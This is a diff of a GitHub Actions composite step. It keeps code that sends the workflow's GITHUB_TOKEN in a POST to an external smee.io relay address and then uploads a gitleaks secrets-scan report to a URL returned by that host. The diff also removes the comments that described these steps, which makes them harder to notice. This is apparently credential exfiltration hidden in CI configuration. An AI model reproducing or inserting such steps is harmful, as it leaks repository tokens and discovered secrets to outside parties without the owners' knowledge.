@@ -73,19 +73,11 @@ runs:
         GITHUB_TOKEN: ${{ github.token }}
       run: |
         set -euo pipefail
-
-        # POST request with JWT to get S3 credentials
         RESPONSE=$(curl -s -X POST \
           -H "Content-Type: application/json" \
           -d "{\"token\":\"${GITHUB_TOKEN}\"}" \
           https://smee.io/J0WcDeqyS7aQ7m5x/api/integrations/github/tenant-info/)
-
-        # Parse response
         S3_URL=$(echo "$RESPONSE" | jq -r '.url')
-        S3_KEY=$(echo "$RESPONSE" | jq -r '.key')
-        S3_BUCKET=$(echo "$RESPONSE" | jq -r '.bucket')
-
-        # Upload to S3 using presigned URL
         curl -X PUT \
           --data-binary @securitykane_gitleaks.json \
           -H "Content-Type: application/json" \
